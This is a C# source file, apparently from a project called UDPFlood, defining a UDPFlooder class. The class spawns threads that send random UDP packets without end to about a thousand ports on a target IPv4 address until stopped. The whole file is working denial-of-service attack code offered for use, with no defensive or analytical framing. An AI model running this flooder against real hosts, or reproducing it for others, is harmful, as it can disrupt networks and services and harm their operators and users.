using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Linq;
using UDPFlood.UDPWorker;

namespace UDPFlood.Flooder;

public sealed class UDPFlooder
{
    public bool IsFlooderWorking { get; private set; }
    public IPAddress Address { get; }
    public int Threads { get; }

    public event EventHandler<int>? PacketSended;

    public UDPFlooder(string address, int threads)
    {
        if (threads <= 0 || threads > 9)
            throw new ArgumentOutOfRangeException(nameof(threads));

        if (!IPAddress.TryParse(address, out var ipAddress) || ipAddress.AddressFamily != AddressFamily.InterNetwork)
            throw new ArgumentOutOfRangeException(nameof(address));

        Threads = threads;
        Address = ipAddress;

        UDPWorker.UDPWorker.Test();
    }

    public void Stop() => IsFlooderWorking = false;

    public void Start()
    {
        IsFlooderWorking = true;

        var ports = GenerateRandomPorts(Threads * 1000, 1, 49150);
        var srcPorts = GenerateRandomPorts(Threads, 49001, 49150);

        var threads = new List<Thread>();

        for (int i = 0; i < srcPorts.Count; i++)
        {
            var src = srcPorts[i];
            var distPorts = ports.Skip(i * Threads).Take(1000);
            threads.Add(new Thread(() => Flood(src, distPorts)));
        }

        foreach (var thread in threads)
            thread.Start();
    }

    private void Flood(int srcPort, IEnumerable<int> ports)
    {
        using var udpClient = new UdpClient(srcPort);

        while (IsFlooderWorking)
        {
            var message = Guid.NewGuid().ToString();
            var bytes = Encoding.UTF8.GetBytes(message);

            foreach (var port in ports)
            {
                var point = new IPEndPoint(Address, port);
                udpClient.Send(bytes, point);
                PacketSended?.Invoke(this, port);
            }
        }
    }

    private static List<int> GenerateRandomPorts(int count, int min, int max)
    {
        var rnd = new Random();
        var ports = new List<int>();

        for (int i = 0; i < count; i++)
        {
            ports.Add(rnd.Next(min, max));

            while (ports.FindIndex(x => x == ports[i]) != i)
                ports[i] = rnd.Next(min, max);
        }

        return ports;
    }
}
